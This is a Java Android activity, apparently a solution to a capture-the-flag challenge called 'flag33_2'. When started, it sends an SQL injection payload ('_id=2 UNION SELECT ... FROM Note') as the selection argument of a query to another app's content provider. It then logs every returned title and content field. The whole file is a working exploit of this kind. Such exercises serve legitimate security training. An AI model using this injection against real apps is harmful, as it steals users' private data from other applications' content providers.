package com.android.zerohextree;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag332Binding;

public class flag33_2 extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();

        if (intent.getAction() != null){
            Log.i("QueryFlag33.2", intent.getAction());
            ContentResolver resolver = getContentResolver();
            Cursor cursor = resolver.query(intent.getData(), null, "_id=2 UNION SELECT 1,title,content,'a' FROM Note", null, null);

            if (cursor != null) {
                String[] columnNames = cursor.getColumnNames();
                while (cursor.moveToNext()) {
                    for (String columnName : columnNames) {
                        String value = cursor.getString(cursor.getColumnIndexOrThrow(columnName));
                        Log.i("QueryFlag33.2", columnName + ": " + value);
                    }
                }
                cursor.close();
            }
        }

    }

}